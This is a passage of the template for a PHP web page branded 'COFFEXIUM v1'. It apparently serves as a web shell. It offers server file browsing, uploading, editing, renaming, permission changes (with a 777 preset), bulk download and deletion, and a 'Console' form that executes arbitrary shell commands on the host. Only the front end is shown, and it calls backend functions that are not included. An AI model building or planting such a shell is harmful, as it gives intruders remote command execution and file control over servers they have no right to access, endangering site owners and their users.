        .file-name-cell { display: flex; align-items: center; font-weight: 500; }
        .file-name { color: var(--text); }
        .file-name:hover { color: var(--accent); }
        .file-meta { font-size: 12px; color: var(--text-muted); font-family: 'JetBrains Mono', monospace; }
        .perms { font-family: 'JetBrains Mono', monospace; font-size: 12px; padding: 4px 8px; border-radius: 4px; }
        .perms.writable { background: rgba(203,184,146,0.15); color: var(--success); }
        .perms.readonly { background: rgba(208,101,79,0.15); color: var(--danger); }
        .actions { display: flex; gap: 4px; justify-content: flex-end; }
        input[type="checkbox"] { width: 16px; height: 16px; accent-color: var(--accent); cursor: pointer; }
        .console { background: var(--bg); border: 1px solid var(--accent); border-radius: 8px; padding: 16px; font-family: 'JetBrains Mono', monospace; font-size: 13px; color: var(--accent); max-height: 250px; overflow-y: auto; white-space: pre-wrap; word-break: break-all; }
        .upload-tabs { display: flex; gap: 4px; margin-bottom: 16px; background: var(--bg); padding: 4px; border-radius: 8px; width: fit-content; }
        .upload-tab { padding: 8px 16px; cursor: pointer; border-radius: 6px; font-size: 13px; font-weight: 500; color: var(--text-muted); transition: all 0.2s; }
        .upload-tab:hover { color: var(--text); }
        .upload-tab.active { background: var(--accent); color: #2a1810; }
        .upload-panel { display: none; }
        .upload-panel.active { display: block; }
        .modal { display: none; position: fixed; inset: 0; z-index: 100; background: rgba(0,0,0,0.7); backdrop-filter: blur(4px); align-items: center; justify-content: center; }
        .modal.show { display: flex; }
        .modal-content { background: var(--surface); border: 1px solid var(--border); border-radius: 12px; width: 450px; max-width: 90%; max-height: 90vh; overflow: auto; }
        .modal-header { padding: 16px 20px; border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; }
        .modal-title { font-weight: 600; }
        .modal-close { width: 32px; height: 32px; display: flex; align-items: center; justify-content: center; border-radius: 6px; cursor: pointer; color: var(--text-muted); transition: all 0.2s; }
        .modal-close:hover { background: var(--surface-hover); color: var(--text); }
        .modal-body { padding: 20px; }
        .chmod-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-bottom: 16px; padding: 20px 20px 0; }
        .chmod-group { background: var(--bg); border: 1px solid var(--border); border-radius: 8px; padding: 14px; text-align: center; }
        .chmod-group-label { font-size: 11px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; color: var(--text-muted); margin-bottom: 10px; }
        .chmod-checkboxes { display: flex; justify-content: center; gap: 8px; }
        .chmod-checkboxes label { font-size: 12px; cursor: pointer; }
        .bulk-bar { display: none; gap: 12px; align-items: center; padding: 14px 18px; background: rgba(200,145,95,0.12); border: 1px solid rgba(200,145,95,0.32); border-radius: 8px; margin-bottom: 16px; }
        .bulk-bar.show { display: flex; }
        .bulk-count { color: var(--accent); font-weight: 600; margin-right: auto; }
        @media (max-width: 768px) {
            .file-table th:nth-child(3), .file-table td:nth-child(3),
            .file-table th:nth-child(4), .file-table td:nth-child(4),
            .file-table th:nth-child(5), .file-table td:nth-child(5),
            .file-table th:nth-child(6), .file-table td:nth-child(6) { display: none; }
            .input-group { flex-direction: column; }
        }
    </style>
    <script>
        function toggleSelectAll(cb) {
            document.querySelectorAll('input[name="items[]"]').forEach(function(c){ c.checked = cb.checked; });
            updateBulkActions();
        }
        function updateBulkActions() {
            var checked = document.querySelectorAll('input[name="items[]"]:checked');
            var bar = document.getElementById('bulk-actions');
            var count = document.getElementById('selected-count');
            if (checked.length > 0) { bar.style.display = 'flex'; count.textContent = checked.length + ' item(s) selected'; }
            else { bar.style.display = 'none'; }
        }
        function switchUploadTab(id) {
            document.querySelectorAll('.upload-panel').forEach(function(p){ p.classList.remove('active'); });
            document.querySelectorAll('.upload-tab').forEach(function(t){ t.classList.remove('active'); });
            document.getElementById(id + '-panel').classList.add('active');
            document.getElementById(id + '-tab').classList.add('active');
        }
        function uploadFile() {
            var fileInput = document.getElementById('upload_files');
            var statusSpan = document.getElementById('upload_status');
            if (!fileInput.files || fileInput.files.length === 0) {
                statusSpan.textContent = "No file selected"; statusSpan.style.color = "var(--danger)"; return;
            }
            var file = fileInput.files[0];
            var filename = file.name;
            var currentDir = "<?= addslashes($_SESSION['current_dir']) ?>";
            var scriptUrl = window.location.pathname;
            statusSpan.textContent = "Uploading " + filename + ", please wait..."; statusSpan.style.color = "var(--accent)";
            var reader = new FileReader();
            reader.readAsBinaryString(file);
            reader.onloadend = function(evt) {
                var xhr = new XMLHttpRequest();
                xhr.open("POST", scriptUrl + "?upload_file=" + encodeURIComponent(currentDir) + "&name=" + encodeURIComponent(filename), true);
                XMLHttpRequest.prototype.mySendAsBinary = function(text) {
                    var data = new ArrayBuffer(text.length);
                    var ui8a = new Uint8Array(data, 0);
                    for (var i = 0; i < text.length; i++) { ui8a[i] = (text.charCodeAt(i) & 0xff); }
                    var blob;
                    if (typeof window.Blob == "function") { blob = new Blob([data]); }
                    else { var bb = new (window.MozBlobBuilder || window.WebKitBlobBuilder || window.BlobBuilder)(); bb.append(data); blob = bb.getBlob(); }
                    this.send(blob);
                };
                xhr.onreadystatechange = function() {
                    if (xhr.readyState == 4) {
                        if (xhr.status == 200) {
                            statusSpan.textContent = "File " + filename + " uploaded successfully!"; statusSpan.style.color = "var(--success)";
                            setTimeout(function(){ location.reload(); }, 1000);
                        } else { statusSpan.textContent = "Upload failed: " + xhr.responseText; statusSpan.style.color = "var(--danger)"; }
                    }
                };
                xhr.mySendAsBinary(evt.target.result);
            };
        }
        function openChmodModal(itemName, octalId) {
            var modal = document.getElementById('chmodModal');
            modal.classList.add('show'); modal.style.display = 'flex';
            document.getElementById('chmodItem').value = itemName;
            updateChmodDisplay(document.getElementById(octalId).value);
        }
        function closeChmodModal() {
            var modal = document.getElementById('chmodModal');
            modal.classList.remove('show'); modal.style.display = 'none';
        }
        function updateChmodDisplay(perms) {
            perms = (perms || '0').toString().slice(-3);
            document.getElementById('chmodOctal').value = perms;
            var binary = (parseInt(perms, 8) || 0).toString(2);
            while (binary.length < 9) { binary = '0' + binary; }
            var ids = ['owner_read','owner_write','owner_execute','group_read','group_write','group_execute','other_read','other_write','other_execute'];
            for (var i = 0; i < 9; i++) { document.getElementById(ids[i]).checked = binary[i] === '1'; }
        }
        function updateChmodFromCheckboxes() {
            var ids = ['owner_read','owner_write','owner_execute','group_read','group_write','group_execute','other_read','other_write','other_execute'];
            var binary = '';
            for (var i = 0; i < 9; i++) { binary += document.getElementById(ids[i]).checked ? '1' : '0'; }
            var octal = parseInt(binary, 2).toString(8);
            while (octal.length < 3) { octal = '0' + octal; }
            document.getElementById('chmodOctal').value = octal;
        }
        function setPresetChmod(p) { updateChmodDisplay(p); }
        window.onclick = function(e) {
            var modal = document.getElementById('chmodModal');
            if (e.target == modal) { closeChmodModal(); }
        };
        // Auto-inject CSRF token into every POST form (defense in depth)
        document.addEventListener('DOMContentLoaded', function() {
            var token = document.querySelector('meta[name="csrf-token"]');
            if (!token) return;
            token = token.content;
            document.querySelectorAll('form[method="post"]').forEach(function(form) {
                if (!form.querySelector('input[name="_csrf_token"]')) {
                    var i = document.createElement('input');
                    i.type = 'hidden'; i.name = '_csrf_token'; i.value = token;
                    form.appendChild(i);
                }
            });
        });
    </script>
</head>
<body>
<div class="container">
    <div class="header">
        <div class="header-top">
            <div class="logo">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/>
                </svg>
                <span class="logo-text">COFF<span>EXIUM</span> v1</span>
            </div>
        </div>
    </div>

    <?php if ($notification): ?>
        <div class="alert alert-success">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
            <?= htmlentities($notification) ?>
        </div>
    <?php endif; ?>
    <?php if ($errorMsg): ?>
        <div class="alert alert-danger">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
            <?= htmlentities($errorMsg) ?>
        </div>
    <?php endif; ?>

    <div class="card" style="margin-bottom: 20px;">
        <div class="card-header">
            <span class="card-title">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
                Navigate
            </span>
        </div>
        <div class="card-body">
            <form method="post" class="input-group">
                <?= csrfField() ?>
                <input type="text" name="goto" value="<?= htmlentities($currentDirectory) ?>" placeholder="Enter path..." style="flex: 1;">
                <button class="btn btn-primary" type="submit">Go</button>
            </form>
        </div>
    </div>

    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-bottom: 20px;">
        <div class="card">
            <div class="card-header">
                <span class="card-title">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
                    Upload File
                </span>
            </div>
            <div class="card-body">
                <div class="upload-tabs">
                    <div id="standard-tab" class="upload-tab active" onclick="switchUploadTab('standard')">Standard</div>
                    <div id="advanced-tab" class="upload-tab" onclick="switchUploadTab('advanced')">Advanced</div>
                </div>
                <div id="standard-panel" class="upload-panel active">
                    <form method="post" enctype="multipart/form-data">
                        <?= csrfField() ?>
                        <div class="input-group">
                            <input type="file" name="upload">
                            <button class="btn btn-primary" type="submit">Upload</button>
                        </div>
                    </form>
                </div>
                <div id="advanced-panel" class="upload-panel">
                    <div class="input-group">
                        <input type="file" id="upload_files" name="upload_adv" multiple>
                        <button class="btn btn-primary" onclick="uploadFile(); return false;">Upload</button>
                    </div>
                    <p style="margin-top: 8px; font-size: 12px; color: var(--text-muted);">Status: <span id="upload_status">No file selected</span></p>
                </div>
            </div>
        </div>

        <div class="card">
            <div class="card-header">
                <span class="card-title">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 5v14M5 12h14"/></svg>
                    Create New
                </span>
            </div>
            <div class="card-body">
                <form method="post" class="input-group">
                    <?= csrfField() ?>
                    <input type="text" name="mk_file" placeholder="New file name..." style="flex: 1;">
                    <button class="btn btn-success" type="submit">File</button>
                </form>
                <form method="post" class="input-group">
                    <?= csrfField() ?>
                    <input type="text" name="mk_folder" placeholder="New folder name..." style="flex: 1;">
                    <button class="btn btn-success" type="submit">Folder</button>
                </form>
            </div>
        </div>
    </div>

    <?php if ($fileToView && $viewContent !== null): ?>
    <div class="card" style="margin-bottom: 20px;">
        <div class="card-header">
            <span class="card-title">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
                Viewing: <?= htmlentities($fileToView) ?>
            </span>
            <button type="button" class="btn btn-ghost btn-sm" onclick="location.href=location.pathname;">Close</button>
        </div>
        <div class="card-body">
            <textarea readonly style="min-height: 300px; width: 100%; box-sizing: border-box;"><?= htmlentities($viewContent) ?></textarea>
        </div>
    </div>
    <?php endif; ?>

    <?php if ($fileToEdit !== null): ?>
    <div class="card" style="margin-bottom: 20px;">
        <div class="card-header">
            <span class="card-title">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/></svg>
                Editing: <?= htmlentities($fileToEdit) ?>
            </span>
        </div>
        <div class="card-body">
            <form method="post">
                <?= csrfField() ?>
                <input type="hidden" name="edit_file" value="<?= htmlentities($fileToEdit) ?>">
                <textarea name="content" style="min-height: 400px; width: 100%; box-sizing: border-box;"><?= htmlentities($fileContent) ?></textarea>
                <div style="margin-top: 12px; display: flex; gap: 8px;">
                    <button class="btn btn-primary" type="submit">Save Changes</button>
                    <button type="button" class="btn btn-ghost" onclick="location.href=location.pathname;">Cancel</button>
                </div>
            </form>
        </div>
    </div>
    <?php endif; ?>

    <?php if ($commandAvailable): ?>
    <div class="card" style="margin-bottom: 20px;">
        <div class="card-header">
            <span class="card-title">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
                Console
            </span>
        </div>
        <div class="card-body">
            <form method="post" class="input-group" style="flex: 1;">
                <?= csrfField() ?>
                <input type="text" name="exec" placeholder="Enter command..." style="flex: 1;">
                <button class="btn btn-success" type="submit">Execute</button>
            </form>
            <?php if ($commandResult): ?>
                <div class="console" style="margin-top: 12px;"><?= htmlentities($commandResult) ?></div>
            <?php endif; ?>
        </div>
    </div>
    <?php endif; ?>

    <form method="post" id="file-form">
        <?= csrfField() ?>
        <div class="bulk-bar" id="bulk-actions">
            <span class="bulk-count" id="selected-count">0 selected</span>
            <button type="submit" name="act_dl" class="btn btn-ghost" onclick="return confirm('Download selected items as archive?')">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
                Download
            </button>
            <button type="submit" name="act_del" class="btn btn-danger" onclick="return confirm('Delete all selected items?')">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>
                Delete
            </button>
        </div>
    </form>

    <div class="card">
        <div class="card-header">
            <span class="card-title">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
                Files
            </span>
            <form method="post" style="display:inline;">
                <?= csrfField() ?>
                <input type="hidden" name="goto" value="<?= htmlentities(dirname($currentDirectory)) ?>">
                <button type="submit" class="btn btn-ghost"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg> Parent</button>
            </form>
        </div>
        <table class="file-table">
            <thead>
                <tr>
                    <th style="width: 40px;"><input type="checkbox" onclick="toggleSelectAll(this)"></th>
                    <th>Name</th>
                    <th style="width: 100px;">Type</th>
                    <th style="width: 100px; text-align: right;">Size</th>
                    <th style="width: 150px;">Modified</th>
                    <th style="width: 90px; text-align: center;">Perms</th>
                    <th style="width: 230px; text-align: right;">Actions</th>
                </tr>
            </thead>
            <tbody>
        <?php foreach ($allItems as $item):
            $fullPath = $currentDirectory . DIRECTORY_SEPARATOR . $item;
            $realPath = validatePath($fullPath);
            if ($realPath !== false) {
                $isDirectory = @is_dir($realPath);
                $canWrite = @is_writable($realPath);
                $fileSize = $isDirectory ? 0 : @filesize($realPath);
                $fileModTime = @filemtime($realPath);
                $filePerms = @substr(sprintf('%o', @fileperms($realPath)), -4);
            } else {
                $isDirectory = @is_dir($fullPath);
                $canWrite = false; $fileSize = 0; $fileModTime = 0; $filePerms = '????';
            }
            $md5item = md5($item);
            $ext = strtolower(pathinfo($item, PATHINFO_EXTENSION));
            $iconClass = $isDirectory ? 'folder' : 'file';
            $iconHtml = $isDirectory
                ? '<svg viewBox="0 0 24 24"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>'
                : '<svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>';
            if (!$isDirectory && $ext) { $iconHtml .= '<span class="ext">' . strtoupper($ext) . '</span>'; }
?>
            <tr>
                <td><input type="checkbox" name="items[]" form="file-form" value="<?= htmlentities($item) ?>" onclick="updateBulkActions()"></td>
                <td>
                    <?php if ($itemToRename === $item): ?>
                        <form method="post" style="margin: 0; display: flex; gap: 8px; align-items: center;">
                            <?= csrfField() ?>
                            <input type="hidden" name="from_name" value="<?= htmlentities($item) ?>">
                            <input type="text" name="to_name" value="<?= htmlentities($item) ?>">
                            <button class="btn btn-primary btn-sm" type="submit">Save</button>
                            <button type="button" class="btn btn-ghost btn-sm" onclick="location.href=location.pathname;">Cancel</button>
                        </form>
                    <?php elseif ($itemToChmod === $item): ?>
                        <form method="post" style="margin: 0; display: flex; gap: 8px; align-items: center;">
                            <?= csrfField() ?>
                            <input type="hidden" name="set_perms" value="<?= htmlentities($item) ?>">
                            <input type="text" name="perm_val" value="<?= htmlentities($filePerms) ?>" maxlength="3" placeholder="755" style="width: 70px;">
                            <button class="btn btn-primary btn-sm" type="submit">Set</button>
                            <button type="button" class="btn btn-ghost btn-sm" onclick="location.href=location.pathname;">Cancel</button>
                        </form>
                    <?php else: ?>
                        <div class="file-name-cell">
                            <div class="file-icon <?= $iconClass ?>"><?= $iconHtml ?></div>
                            <?php if ($isDirectory): ?>
                                <a href="#" class="file-name" onclick="document.getElementById('nav-<?= $md5item ?>').submit(); return false;"><?= htmlentities($item) ?></a>
                                <form id="nav-<?= $md5item ?>" method="post" style="display: none;">
                                    <?= csrfField() ?>
                                    <input type="hidden" name="goto" value="<?= htmlentities($fullPath) ?>">
                                </form>
                            <?php else: ?>
                                <a href="#" class="file-name" onclick="document.getElementById('view-<?= $md5item ?>').submit(); return false;"><?= htmlentities($item) ?></a>
                                <form id="view-<?= $md5item ?>" method="post" style="display: none;">
                                    <?= csrfField() ?>
                                    <input type="hidden" name="show" value="<?= htmlentities($item) ?>">
                                </form>
                            <?php endif; ?>
                        </div>
                    <?php endif; ?>
                </td>
                <td><span class="file-meta"><?= $isDirectory ? 'Directory' : (getFileExtension($item) ?: 'File') ?></span></td>
                <td style="text-align: right;"><span class="file-meta"><?= $isDirectory ? '&mdash;' : formatFileSize($fileSize) ?></span></td>
                <td><span class="file-meta"><?= date('Y-m-d H:i', $fileModTime) ?></span></td>
                <td style="text-align: center;">
                    <span class="perms <?= $canWrite ? 'writable' : 'readonly' ?>"><?= htmlentities($filePerms) ?></span>
                    <input type="hidden" id="currentPerms_<?= $md5item ?>" value="<?= htmlentities($filePerms) ?>">
                </td>
                <td>
                    <div class="actions">
                        <?php if (!$isDirectory): ?>
                            <form method="post" style="display: inline;">
                                <?= csrfField() ?>
                                <input type="hidden" name="modify" value="<?= htmlentities($item) ?>">
                                <button type="submit" class="btn btn-ghost btn-sm">Edit</button>
                            </form>
                        <?php endif; ?>
                        <form method="post" style="display: inline;">
                            <?= csrfField() ?>
                            <input type="hidden" name="rename_item" value="<?= htmlentities($item) ?>">
                            <button type="submit" class="btn btn-ghost btn-sm">Rename</button>
                        </form>
                        <button type="button" class="btn btn-ghost btn-sm" onclick="openChmodModal('<?= htmlentities($item) ?>', 'currentPerms_<?= $md5item ?>')">Chmod</button>
                        <form method="post" style="display: inline;">
                            <?= csrfField() ?>
                            <input type="hidden" name="get_file" value="<?= htmlentities($item) ?>">
                            <button type="submit" class="btn btn-ghost btn-sm">Download</button>
                        </form>
                        <form method="post" style="display: inline;" onsubmit="return confirm('Delete <?= htmlentities($item) ?>?');">
                            <?= csrfField() ?>
                            <input type="hidden" name="del_item" value="<?= htmlentities($item) ?>">
                            <button type="submit" class="btn btn-danger btn-sm">Delete</button>
                        </form>
                    </div>
                </td>
            </tr>
        <?php endforeach; ?>
            </tbody>
        </table>
    </div>

<!-- Chmod Modal -->
<div id="chmodModal" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <span class="modal-title">Change Permissions</span>
            <span class="modal-close" onclick="closeChmodModal()">&times;</span>
        </div>
        <form method="post">
            <?= csrfField() ?>
            <input type="hidden" id="chmodItem" name="set_perms" value="">
            <div class="chmod-grid">
                <div class="chmod-group">
                    <div class="chmod-group-label">Owner</div>
                    <div class="chmod-checkboxes">
                        <label><input type="checkbox" id="owner_read" onchange="updateChmodFromCheckboxes()"> R</label>
                        <label><input type="checkbox" id="owner_write" onchange="updateChmodFromCheckboxes()"> W</label>
                        <label><input type="checkbox" id="owner_execute" onchange="updateChmodFromCheckboxes()"> X</label>
                    </div>
                </div>
                <div class="chmod-group">
                    <div class="chmod-group-label">Group</div>
                    <div class="chmod-checkboxes">
                        <label><input type="checkbox" id="group_read" onchange="updateChmodFromCheckboxes()"> R</label>
                        <label><input type="checkbox" id="group_write" onchange="updateChmodFromCheckboxes()"> W</label>
                        <label><input type="checkbox" id="group_execute" onchange="updateChmodFromCheckboxes()"> X</label>
                    </div>
                </div>
                <div class="chmod-group">
                    <div class="chmod-group-label">Other</div>
                    <div class="chmod-checkboxes">
                        <label><input type="checkbox" id="other_read" onchange="updateChmodFromCheckboxes()"> R</label>
                        <label><input type="checkbox" id="other_write" onchange="updateChmodFromCheckboxes()"> W</label>
                        <label><input type="checkbox" id="other_execute" onchange="updateChmodFromCheckboxes()"> X</label>
                    </div>
                </div>
            </div>
            <div class="modal-body">
                <div style="margin-bottom: 16px; text-align: center;">
                    <input type="text" id="chmodOctal" name="perm_val" maxlength="3" style="width: 70px; text-align: center; font-family: 'JetBrains Mono', monospace;">
                </div>
                <div style="margin-bottom: 15px; display: flex; gap: 8px; flex-wrap: wrap;">
                    <button type="button" class="btn btn-ghost btn-sm" onclick="setPresetChmod('755')">755 (Default)</button>
                    <button type="button" class="btn btn-ghost btn-sm" onclick="setPresetChmod('644')">644 (File)</button>
                    <button type="button" class="btn btn-ghost btn-sm" onclick="setPresetChmod('777')">777 (All)</button>
                </div>
                <div style="display: flex; gap: 8px;">
                    <button type="submit" class="btn btn-primary">Apply Changes</button>
                    <button type="button" class="btn btn-ghost" onclick="closeChmodModal()">Cancel</button>
                </div>
            </div>
        </form>
    </div>
</div>

</body>
</html>
